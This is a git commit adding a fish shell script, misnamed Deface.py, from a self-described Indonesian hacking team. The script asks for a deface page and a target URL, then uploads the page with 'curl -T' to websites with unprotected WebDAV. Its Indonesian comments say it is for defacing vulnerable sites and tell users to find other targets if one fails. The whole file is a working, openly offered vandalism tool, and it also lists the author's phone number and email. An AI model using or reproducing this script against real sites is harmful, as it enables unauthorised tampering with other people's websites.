936721f88be38680a72d4991d16d9a8deaae9fbf
Mr.TamfanX <62769928+Anonymous3-SIT@users.noreply.github.com>
2020-03-31 22:50:05 +0700

    Add files via upload

---
+++ Deface.py
@@ -0,0 +1,45 @@
+#!/usr/bin/fish
+# Jangan Recode Ya :V
+# Recode Tidak Membuatmu Jadi Pencipta Kode :D
+# Selamat Menikmati :V
+
+clear
+toilet -f future '    SIT - DEFACE' | lolcat
+echo
+echo 'Creator  : Mr.TamfanX' | lolcat
+echo 'Team     : SHUTDOWN INDO TEAM' | lolcat
+echo 'Github   : https://github.com/Anonymous3-SIT' | lolcat
+echo 'WhatsApp : 628999271792' | lolcat
+echo 'Gmail    : anonymoussit36@gmail.com' | lolcat
+echo
+echo '''
+SCRIPT INI BERFUNGSI UNTUK MENDEFACE WEBSITE
+YANG VULN / RENTAN TERHADAP BUG WEBDAV
+''' | lolcat
+echo
+echo 'Example : index.html' | lolcat
+echo '_:: NAMA SCRIPT DEFACE KALIAN ::_' | lolcat
+echo
+read sc
+echo
+echo 'Example : http://site.com' | lolcat
+echo '_:: SITE TARGET KALIAN ::_' | lolcat
+echo
+read target
+echo
+echo 'PROSES ...' | lolcat
+sleep 2
+echo
+echo
+curl -T /storage/emulated/0/$sc $target
+echo 'HASIL : '$target/$sc | lolcat
+echo '''
+JIKA HASILNYA TERDEFACE BERARTI WEBSITE
+TERSEBUT VULN WEBDAV. JIKA TIDAK, CARI TARGET
+YANG LAIN :)
+''' | lolcat
+
+
+
+
+
